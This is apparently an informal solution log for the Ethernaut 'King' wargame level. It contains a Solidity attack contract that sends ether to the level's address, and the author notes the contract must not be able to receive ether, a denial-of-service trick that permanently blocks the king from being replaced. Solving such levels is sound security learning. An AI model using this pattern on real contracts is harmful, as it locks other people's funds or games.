I think I just need to make sure that 
the new king(actually my smart contract)
cannot receive ether.

I will deploy a contract on remix.

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract RealKing {
    address target = 0x42fD79Eb8001d84f6A1372d61184926Ada86BdB4;
    function sendETH() external payable {
        (bool success, ) = target.call{value: msg.value }("");
       // require(success, "ether not sent");
    }
}



    ah.. shit. I should specify function selector. my bad.

    ah...? it was receive function. I should be able to just send eth with out message.

    damn, I just had to send more


Most of Ethernaut's levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.

In this case, see: King of the Ether and King of the Ether Postmortem
